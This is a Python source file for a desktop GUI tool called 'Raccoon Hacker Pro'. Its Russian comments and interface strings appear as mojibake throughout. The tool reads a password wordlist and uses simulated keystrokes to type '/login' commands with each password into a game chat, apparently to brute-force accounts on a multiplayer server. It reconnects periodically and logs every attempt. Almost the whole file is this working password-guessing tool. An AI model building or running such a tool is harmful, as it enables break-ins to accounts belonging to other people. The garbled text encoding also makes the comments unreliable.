import time
import pyautogui
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from PIL import Image, ImageTk, ImageSequence, ImageOps
import random
from itertools import cycle
import pygame
import os
import sys
import keyboard
import tkinter.font as tkfont
from ctypes import windll
import logging

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='raccoon_bruteforce.log'
)


class AnimatedButton(ttk.Button):
    """–ö–Ω–æ–ø–∫–∞ —Å –∞–Ω–∏–º–∞—Ü–∏–µ–π –ø—Ä–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏–∏"""

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.default_bg = self.cget('style')
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)

    def on_enter(self, e):
        self.configure(style='Hover.TButton')

    def on_leave(self, e):
        self.configure(style=self.default_bg)


class RaccoonBruteforceApp:
    """–°–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –¥–ª—è –ø–æ–¥–±–æ—Ä–∞ –ø–∞—Ä–æ–ª–µ–π —Å –∞–Ω–∏–º–∞—Ü–∏—è–º–∏"""

    def __init__(self, root):
        self.root = root
        self.root.title("‚ú® Raccoon Hacker Pro ü¶ù")

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ DPI –¥–ª—è Windows
        if sys.platform == 'win32':
            windll.shcore.SetProcessDpiAwareness(1)

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
        self.is_running = False
        self.is_paused = False
        self.password_file = tk.StringVar()
        self.delay_before_start = tk.DoubleVar(value=3.0)
        self.delay_between_attempts = tk.DoubleVar(value=0.5)
        self.max_attempts = tk.IntVar(value=100)
        self.reconnect_after = tk.IntVar(value=10)
        self.chat_key = tk.StringVar(value='t')

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Ç–µ–º—ã –∏ —Å—Ç–∏–ª–µ–π
        self.setup_styles()
        self.setup_ui()

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã
        self.init_system()

        # –ó–∞–≥—Ä—É–∑–∫–∞ –∞—Å—Å–µ—Ç–æ–≤
        self.load_assets()

        # –ó–∞–ø—É—Å–∫ –∞–Ω–∏–º–∞—Ü–∏–π
        self.start_animations()

    def setup_styles(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∞ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Å—Ç–∏–ª–µ–π"""
        style = ttk.Style()

        # –¢–µ–º–Ω–∞—è —Ç–µ–º–∞
        self.root.configure(bg='#121212')

        # –°–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ü–≤–µ—Ç–∞
        style.theme_create('modern', settings={
            "TFrame": {
                "configure": {"background": "#1E1E1E", "borderwidth": 0, "relief": "flat"}
            },
            "TLabel": {
                "configure": {
                    "background": "#1E1E1E",
                    "foreground": "#E0E0E0",
                    "font": ("Segoe UI", 10)
                }
            },
            "TButton": {
                "configure": {
                    "background": "#2A2A2A",
                    "foreground": "#FFFFFF",
                    "font": ("Segoe UI", 10, "bold"),
                    "borderwidth": 0,
                    "relief": "flat",
                    "padding": 10
                },
                "map": {
                    "background": [("active", "#3A3A3A"), ("pressed", "#1A1A1A")],
                    "foreground": [("active", "#FFFFFF")]
                }
            },
            "Hover.TButton": {
                "configure": {
                    "background": "#3A3A3A",
                    "foreground": "#FFFFFF"
                }
            },
            "TEntry": {
                "configure": {
                    "fieldbackground": "#2A2A2A",
                    "foreground": "#FFFFFF",
                    "insertcolor": "#FFFFFF",
                    "borderwidth": 0,
                    "relief": "flat",
                    "padding": 5
                }
            },
            "TProgressbar": {
                "configure": {
                    "background": "#FF7043",
                    "troughcolor": "#2A2A2A",
                    "borderwidth": 0,
                    "relief": "flat"
                }
            }
        })
        style.theme_use('modern')

        # –ö–∞—Å—Ç–æ–º–Ω—ã–µ —à—Ä–∏—Ñ—Ç—ã
        self.title_font = tkfont.Font(family="Segoe UI", size=18, weight="bold")
        self.subtitle_font = tkfont.Font(family="Segoe UI", size=12)

    def setup_ui(self):
        """–°–æ–∑–¥–∞–Ω–∏–µ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω–æ–≥–æ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞"""
        # –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä
        self.main_frame = ttk.Frame(self.root)
        self.main_frame.pack(fill="both", expand=True, padx=20, pady=20)

        # –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ñ–æ–Ω
        self.setup_animated_background()

        # –ó–∞–≥–æ–ª–æ–≤–æ–∫
        self.header_frame = ttk.Frame(self.main_frame)
        self.header_frame.pack(fill="x", pady=(0, 20))

        ttk.Label(
            self.header_frame,
            text="‚ú® Raccoon Hacker Pro ü¶ù",
            font=self.title_font,
            foreground="#FF7043"
        ).pack(side="left")

        # –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –µ–Ω–æ—Ç
        self.raccoon_label = ttk.Label(self.header_frame)
        self.raccoon_label.pack(side="right")

        # –û—Å–Ω–æ–≤–Ω–æ–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ
        self.content_frame = ttk.Frame(self.main_frame)
        self.content_frame.pack(fill="both", expand=True)

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏
        self.setup_settings_accordion()

        # –ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
        self.setup_control_panel()

        # –°—Ç–∞—Ç—É—Å –±–∞—Ä
        self.setup_status_bar()

    def setup_animated_background(self):
        """–ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç–Ω—ã–π —Ñ–æ–Ω"""
        self.bg_canvas = tk.Canvas(self.main_frame, highlightthickness=0)
        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
        self.bg_colors = cycle(['#1E1E1E', '#252525', '#2A2A2A', '#252525'])

    def animate_background(self):
        """–ê–Ω–∏–º–∞—Ü–∏—è —Ñ–æ–Ω–∞"""
        if hasattr(self, 'bg_colors') and hasattr(self, 'bg_canvas'):
            try:
                if self.bg_canvas.winfo_exists():
                    color = next(self.bg_colors)
                    self.bg_canvas.config(bg=color)
                    self.root.after(3000, self.animate_background)
            except (tk.TclError, Exception) as e:
                logging.error(f"–û—à–∏–±–∫–∞ –∞–Ω–∏–º–∞—Ü–∏–∏ —Ñ–æ–Ω–∞: {e}")

    def setup_settings_accordion(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –≤ –∞–∫–∫–æ—Ä–¥–µ–æ–Ω–µ"""
        self.settings_frame = ttk.Frame(self.content_frame)
        self.settings_frame.pack(fill="x", pady=(0, 20))

        # –§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π
        file_frame = ttk.Frame(self.settings_frame)
        file_frame.pack(fill="x", pady=5)

        ttk.Label(
            file_frame,
            text="üîí –§–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).pack(side="left", padx=5)

        self.file_entry = ttk.Entry(file_frame, textvariable=self.password_file, width=40)
        self.file_entry.pack(side="left", fill="x", expand=True, padx=5)

        self.browse_btn = AnimatedButton(
            file_frame,
            text="–û–±–∑–æ—Ä...",
            command=self.select_file
        )
        self.browse_btn.pack(side="left", padx=5)

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞–¥–µ—Ä–∂–µ–∫
        self.setup_delay_settings()

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ø—ã—Ç–æ–∫
        self.setup_attempts_settings()

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ —á–∞—Ç–∞
        self.setup_chat_settings()

    def setup_delay_settings(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞–¥–µ—Ä–∂–µ–∫"""
        delay_frame = ttk.Frame(self.settings_frame)
        delay_frame.pack(fill="x", pady=5)

        ttk.Label(
            delay_frame,
            text="‚è±Ô∏è –ó–∞–¥–µ—Ä–∂–∫–∏:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Label(delay_frame, text="–ü–µ—Ä–µ–¥ —Å—Ç–∞—Ä—Ç–æ–º (—Å–µ–∫):").grid(row=1, column=0, sticky="w", padx=15)
        ttk.Scale(
            delay_frame,
            from_=0,
            to=10,
            variable=self.delay_before_start,
            orient="horizontal"
        ).grid(row=1, column=1, sticky="ew", padx=5)

        ttk.Label(delay_frame, text="–ú–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏ (—Å–µ–∫):").grid(row=2, column=0, sticky="w", padx=15)
        ttk.Scale(
            delay_frame,
            from_=0.1,
            to=2,
            variable=self.delay_between_attempts,
            orient="horizontal"
        ).grid(row=2, column=1, sticky="ew", padx=5)

    def setup_attempts_settings(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∏ –ø–æ–ø—ã—Ç–æ–∫"""
        attempts_frame = ttk.Frame(self.settings_frame)
        attempts_frame.pack(fill="x", pady=5)

        ttk.Label(
            attempts_frame,
            text="üî¢ –ü–æ–ø—ã—Ç–∫–∏:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Label(attempts_frame, text="–ú–∞–∫—Å. –ø–æ–ø—ã—Ç–æ–∫:").grid(row=1, column=0, sticky="w", padx=15)
        ttk.Entry(attempts_frame, textvariable=self.max_attempts, width=10).grid(row=1, column=1, sticky="w", padx=5)

        ttk.Label(attempts_frame, text="–ü–µ—Ä–µ–ø–æ–¥–∫–ª. –ø–æ—Å–ª–µ:").grid(row=2, column=0, sticky="w", padx=15)
        ttk.Entry(attempts_frame, textvariable=self.reconnect_after, width=10).grid(row=2, column=1, sticky="w", padx=5)

    def setup_chat_settings(self):
        """–ù–∞—Å—Ç—Ä–æ–π–∫–∏ —á–∞—Ç–∞"""
        chat_frame = ttk.Frame(self.settings_frame)
        chat_frame.pack(fill="x", pady=5)

        ttk.Label(
            chat_frame,
            text="üí¨ –ö–ª–∞–≤–∏—à–∞ —á–∞—Ç–∞:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)

        ttk.Entry(chat_frame, textvariable=self.chat_key, width=5).grid(row=0, column=1, sticky="w", padx=5)
        ttk.Label(chat_frame, text="(t, enter, / –∏ —Ç.–¥.)").grid(row=0, column=2, sticky="w")

    def setup_control_panel(self):
        """–ü–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è"""
        control_frame = ttk.Frame(self.content_frame)
        control_frame.pack(fill="x", pady=(20, 10))

        # –ü—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
        self.progress = ttk.Progressbar(
            control_frame,
            orient="horizontal",
            length=800,
            mode="determinate"
        )
        self.progress.pack(fill="x", pady=(0, 20))

        # –ö–Ω–æ–ø–∫–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
        btn_frame = ttk.Frame(control_frame)
        btn_frame.pack(fill="x")

        self.start_btn = AnimatedButton(
            btn_frame,
            text="üöÄ –ù–∞—á–∞—Ç—å –≤–∑–ª–æ–º",
            command=self.start_bruteforce
        )
        self.start_btn.pack(side="left", expand=True, padx=5)

        self.stop_btn = AnimatedButton(
            btn_frame,
            text="üõë –°—Ç–æ–ø",
            command=self.stop_bruteforce,
            state="disabled"
        )
        self.stop_btn.pack(side="left", expand=True, padx=5)

        self.pause_btn = AnimatedButton(
            btn_frame,
            text="‚è∏Ô∏è –ü–∞—É–∑–∞",
            command=self.toggle_pause,
            state="disabled"
        )
        self.pause_btn.pack(side="left", expand=True, padx=5)

        # –ì—Ä–æ–º–∫–æ—Å—Ç—å
        volume_frame = ttk.Frame(control_frame)
        volume_frame.pack(fill="x", pady=10)

        ttk.Label(
            volume_frame,
            text="üîä –ì—Ä–æ–º–∫–æ—Å—Ç—å:",
            font=self.subtitle_font,
            foreground="#FF7043"
        ).pack(side="left", padx=5)

        self.volume_slider = ttk.Scale(
            volume_frame,
            from_=0,
            to=1,
            value=0.7,
            command=self.update_volume
        )
        self.volume_slider.pack(side="left", fill="x", expand=True, padx=5)

    def setup_status_bar(self):
        """–°—Ç–∞—Ç—É—Å –±–∞—Ä"""
        self.status_frame = ttk.Frame(self.main_frame)
        self.status_frame.pack(fill="x", pady=(10, 0))

        self.status_label = ttk.Label(
            self.status_frame,
            text="ü¶ù –ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ!",
            font=self.subtitle_font,
            foreground="#4CAF50"
        )
        self.status_label.pack(side="left", padx=10)

        ttk.Label(
            self.status_frame,
            text="F7 - –≤–∫–ª/–≤—ã–∫–ª | Ctrl+Q - –≤—ã—Ö–æ–¥ | P - –ø–∞—É–∑–∞",
            font=("Segoe UI", 8),
            foreground="#757575"
        ).pack(side="right", padx=10)

    def init_system(self):
        """–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–∏—Å—Ç–µ–º—ã"""
        # –†–∞–∑–º–µ—Ä—ã —ç–∫—Ä–∞–Ω–∞
        self.screen_width = self.root.winfo_screenwidth()
        self.screen_height = self.root.winfo_screenheight()

        # –§—Ä–∞–∑—ã –µ–Ω–æ—Ç–∞
        self.raccoon_phrases = [
            "üîì –í–∑–ª–∞–º—ã–≤–∞—é...",
            "ü¶ù –®—É—Ä—à—É –ø–∞—Ä–æ–ª—è–º–∏!",
            "üíª –•–∞–∫–µ—Ä-–µ–Ω–æ—Ç –≤ –¥–µ–ª–µ!",
            "üç™ –ì–¥–µ –º–æ–∏ –ø–µ—á–µ–Ω—å–∫–∏?..",
            "üéØ –ü–æ—á—Ç–∏ –ø–æ–ª—É—á–∏–ª–æ—Å—å!"
        ]

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∑–≤—É–∫–æ–≤
        pygame.mixer.init()
        self.sounds = {
            "start": None,
            "click": None,
            "success": None,
            "error": None
        }
        self.load_sounds()

        # –ù–∞—Å—Ç—Ä–æ–π–∫–∏ PyAutoGUI
        pyautogui.PAUSE = 0.1
        pyautogui.FAILSAFE = True

        # –ì–æ—Ä—è—á–∏–µ –∫–ª–∞–≤–∏—à–∏
        if sys.platform != 'linux':
            keyboard.add_hotkey('F7', self.toggle_bruteforce)
            keyboard.add_hotkey('ctrl+q', self.on_close)
            keyboard.add_hotkey('p', self.toggle_pause)
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

    def load_sounds(self):
        """–ó–∞–≥—Ä—É–∑–∫–∞ –∑–≤—É–∫–æ–≤"""
        try:
            base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
            sound_files = {
                "start": "start.wav",
                "click": "click.wav",
                "success": "success.wav",
                "error": "error.wav"
            }

            for name, filename in sound_files.items():
                path = os.path.join(base_dir, filename)
                if os.path.exists(path):
                    self.sounds[name] = pygame.mixer.Sound(path)
                    logging.info(f"–ó–≤—É–∫ {name} –∑–∞–≥—Ä—É–∂–µ–Ω —É—Å–ø–µ—à–Ω–æ")
                else:
                    logging.warning(f"–§–∞–π–ª –∑–≤—É–∫–∞ {filename} –Ω–µ –Ω–∞–π–¥–µ–Ω")

        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∑–≤—É–∫–æ–≤: {e}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∑–≤—É–∫–∏: {e}")

    def play_sound(self, sound_name):
        """–í–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏–µ –∑–≤—É–∫–∞"""
        if sound_name in self.sounds and self.sounds[sound_name]:
            try:
                self.sounds[sound_name].play()
            except Exception as e:
                logging.error(f"–û—à–∏–±–∫–∞ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞ {sound_name}: {e}")

    def update_volume(self, value):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –≥—Ä–æ–º–∫–æ—Å—Ç–∏"""
        volume = float(value)
        for name, sound in self.sounds.items():
            if sound:
                try:
                    sound.set_volume(volume)
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –¥–ª—è {name}: {e}")

    def load_assets(self):
        """–ó–∞–≥—Ä—É–∑–∫–∞ —Ä–µ—Å—É—Ä—Å–æ–≤"""
        try:
            base_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

            # –ê–Ω–∏–º–∏—Ä–æ–≤–∞–Ω–Ω—ã–π –µ–Ω–æ—Ç
            gif_path = os.path.join(base_dir, "raccoon.gif")
            if os.path.exists(gif_path):
                self.raccoon_gif = Image.open(gif_path)
                self.frames = []

                for frame in ImageSequence.Iterator(self.raccoon_gif):
                    try:
                        img = ImageOps.pad(
                            frame.convert("RGBA"),
                            (100, 100),
                            method=Image.Resampling.LANCZOS
                        )
                        photo = ImageTk.PhotoImage(img)
                        self.frames.append(photo)
                    except Exception as e:
                        logging.error(f"–û—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–∞–¥—Ä–∞ GIF: {e}")

                if self.frames:
                    self.frame_cycle = cycle(self.frames)
                    self.current_frame = next(self.frame_cycle)
                    logging.info("–ê–Ω–∏–º–∞—Ü–∏—è –µ–Ω–æ—Ç–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
                else:
                    logging.warning("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∫–∞–¥—Ä—ã –∞–Ω–∏–º–∞—Ü–∏–∏")
                    self.current_frame = None
            else:
                logging.warning("–§–∞–π–ª raccoon.gif –Ω–µ –Ω–∞–π–¥–µ–Ω")
                self.frames = []
                self.current_frame = None

            # –ò–∫–æ–Ω–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è
            ico_path = os.path.join(base_dir, "raccoon.ico")
            if os.path.exists(ico_path):
                try:
                    self.root.iconbitmap(ico_path)
                    logging.info("–ò–∫–æ–Ω–∫–∞ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∑–∞–≥—Ä—É–∂–µ–Ω–∞ —É—Å–ø–µ—à–Ω–æ")
                except Exception as e:
                    logging.error(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∏–∫–æ–Ω–∫–∏: {e}")
            else:
                logging.warning("–§–∞–π–ª raccoon.ico –Ω–µ –Ω–∞–π–¥–µ–Ω")

        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –∞—Å—Å–µ—Ç–æ–≤: {e}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ä–µ—Å—É—Ä—Å—ã: {e}")
            self.frames = []
            self.current_frame = None

    def start_animations(self):
        """–ó–∞–ø—É—Å–∫ –∞–Ω–∏–º–∞—Ü–∏–π"""
        self._start_idle_animation()
        self.animate_background()

    def _start_idle_animation(self):
        """–ê–Ω–∏–º–∞—Ü–∏—è –µ–Ω–æ—Ç–∞"""
        if not self.frames:
            return

        try:
            self.current_frame = next(self.frame_cycle)
            self.raccoon_label.configure(image=self.current_frame)
            delay = 100 if not self.is_running else 50
            self.root.after(delay, self._start_idle_animation)
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –≤ –∞–Ω–∏–º–∞—Ü–∏–∏: {e}")

    def toggle_bruteforce(self):
        """–ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ —Ä–µ–∂–∏–º–∞ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞"""
        if self.is_running:
            self.stop_bruteforce()
        else:
            self.start_bruteforce()

    def toggle_pause(self):
        """–ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –ø–∞—É–∑—ã"""
        if not self.is_running:
            return

        self.is_paused = not self.is_paused
        if self.is_paused:
            self.pause_btn.config(text="‚ñ∂Ô∏è –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å")
            self.status_label.config(text="‚è∏Ô∏è –í–∑–ª–æ–º –Ω–∞ –ø–∞—É–∑–µ...")
            self.play_sound("click")
        else:
            self.pause_btn.config(text="‚è∏Ô∏è –ü–∞—É–∑–∞")
            self.status_label.config(text="ü¶ù –ü—Ä–æ–¥–æ–ª–∂–∞—é –≤–∑–ª–æ–º...")
            self.play_sound("start")

    def on_close(self):
        """–ó–∞–∫—Ä—ã—Ç–∏–µ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è"""
        try:
            if hasattr(self, 'bg_canvas'):
                try:
                    self.root.after_cancel(self.animate_background)
                except:
                    pass

            if sys.platform != 'linux':
                keyboard.unhook_all_hotkeys()
            if self.is_running:
                self.stop_bruteforce()

            try:
                pygame.mixer.quit()
            except:
                pass

            self.root.destroy()
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏: {e}")
            self.root.destroy()

    def select_file(self):
        """–í—ã–±–æ—Ä —Ñ–∞–π–ª–∞ —Å –ø–∞—Ä–æ–ª—è–º–∏"""
        try:
            file_path = filedialog.askopenfilename(
                title="–í—ã–±–µ—Ä–∏—Ç–µ —Ñ–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            if file_path:
                self.password_file.set(file_path)
                self.status_label.config(text="–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω! ü¶ù")
                self.play_sound("start")
                logging.info(f"–í—ã–±—Ä–∞–Ω —Ñ–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏: {file_path}")
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –≤—ã–±–æ—Ä–∞ —Ñ–∞–π–ª–∞: {e}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–±—Ä–∞—Ç—å —Ñ–∞–π–ª: {e}")

    def get_passwords(self):
        """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π –∏–∑ —Ñ–∞–π–ª–∞"""
        try:
            with open(self.password_file.get(), 'r', encoding='utf-8') as file:
                passwords = [line.strip() for line in file.readlines() if line.strip()]
                unique_passwords = list(set(passwords))
                max_attempts = min(self.max_attempts.get(), len(unique_passwords))
                return unique_passwords[:max_attempts]
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ —á—Ç–µ–Ω–∏—è —Ñ–∞–π–ª–∞ –ø–∞—Ä–æ–ª–µ–π: {e}")
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏: {e}")
            return []

    def start_bruteforce(self):
        """–ó–∞–ø—É—Å–∫ –±—Ä—É—Ç—Ñ–æ—Ä—Å–∞"""
        if not self.password_file.get():
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ï–Ω–æ—Ç –Ω–µ –Ω–∞—à–µ–ª —Ñ–∞–π–ª —Å –ø–∞—Ä–æ–ª—è–º–∏! ü¶ù")
            self.play_sound("error")
            return

        if not os.path.exists(self.password_file.get()):
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∑–∞–Ω–Ω—ã–π —Ñ–∞–π–ª –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç! ü¶ù")
            self.play_sound("error")
            return

        passwords = self.get_passwords()
        if not passwords:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–§–∞–π–ª –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç –∏–ª–∏ —Å–æ–¥–µ—Ä–∂–∏—Ç –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã! ü¶ù")
            self.play_sound("error")
            return

        self.is_running = True
        self.is_paused = False
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.pause_btn.config(state="normal")
        self.play_sound("start")

        total_passwords = len(passwords)
        self.progress["maximum"] = total_passwords

        # –ü—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ
        messagebox.showwarning("–í–Ω–∏–º–∞–Ω–∏–µ",
                               f"–ß–µ—Ä–µ–∑ {self.delay_before_start.get()} —Å–µ–∫—É–Ω–¥ –Ω–∞—á–Ω–µ—Ç—Å—è –≤–≤–æ–¥ {total_passwords} –ø–∞—Ä–æ–ª–µ–π!\n"
                               "–ü–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –≤ –Ω—É–∂–Ω–æ–µ –æ–∫–Ω–æ."
                               )

        try:
            time.sleep(self.delay_before_start.get())
        except KeyboardInterrupt:
            self.stop_bruteforce()
            return

        for i, password in enumerate(passwords, 1):
            if not self.is_running:
                break

            while self.is_paused and self.is_running:
                time.sleep(0.1)
                self.root.update()

            self._attempt_login(i, password, total_passwords)
            self._handle_reconnect(i)
            self._update_progress(i)

        if self.is_running:
            self.status_label.config(text="–í–∑–ª–æ–º –∑–∞–≤–µ—Ä—à–µ–Ω! üéâü¶ù")
            self.play_sound("success")
        self.stop_bruteforce()

    def _attempt_login(self, attempt, password, total):
        """–ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞"""
        try:
            self.play_sound("click")
            display_password = password[:5] + '...' if len(password) > 5 else password
            self.status_label.config(text=f"–ü–æ–ø—ã—Ç–∫–∞ {attempt}/{total}: {display_password}")
            self.root.update()

            # –û—Ç–∫—Ä—ã–≤–∞–µ–º —á–∞—Ç
            pyautogui.press(self.chat_key.get())
            time.sleep(0.3)

            # –í–≤–æ–¥–∏–º –∫–æ–º–∞–Ω–¥—É
            command = f'/login "{password}"'
            self.root.clipboard_clear()
            self.root.clipboard_append(command)
            time.sleep(0.2)
            pyautogui.hotkey('ctrl', 'v')
            time.sleep(0.2)
            pyautogui.press('enter')

            # –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ
            logging.info(f"[–ü–æ–ø—ã—Ç–∫–∞ {attempt}] –í–≤–µ–¥–µ–Ω–æ: {command[:20]}...")

            # –ó–∞–¥–µ—Ä–∂–∫–∞ –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏
            time.sleep(self.delay_between_attempts.get())

        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è: {e}")
            self.status_label.config(text=f"–û—à–∏–±–∫–∞ –≤–≤–æ–¥–∞! üö´")
            self.play_sound("error")

    def _handle_reconnect(self, attempt):
        """–ü–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ"""
        if (attempt % self.reconnect_after.get() == 0) and (attempt != 0):
            self.reconnect()

    def reconnect(self):
        """–ü—Ä–æ—Ü–µ–¥—É—Ä–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"""
        try:
            self.status_label.config(text="–ï–Ω–æ—Ç –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–∞–µ—Ç—Å—è... üîÑ")
            self.play_sound("click")
            time.sleep(0.5)

            # –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –∫—É—Ä—Å–æ—Ä–∞
            screen_width, screen_height = pyautogui.size()
            x = random.randint(int(screen_width * 0.4), int(screen_width * 0.6))
            y = random.randint(int(screen_height * 0.4), int(screen_height * 0.6))

            pyautogui.moveTo(x, y, duration=1, tween=pyautogui.easeInOutQuad)
            pyautogui.click()
            time.sleep(4)

        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {e}")
            self.status_label.config(text="–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è! üö´")
            self.play_sound("error")

    def _update_progress(self, value):
        """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞"""
        try:
            self.progress["value"] = value
            self.root.update_idletasks()
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞: {e}")

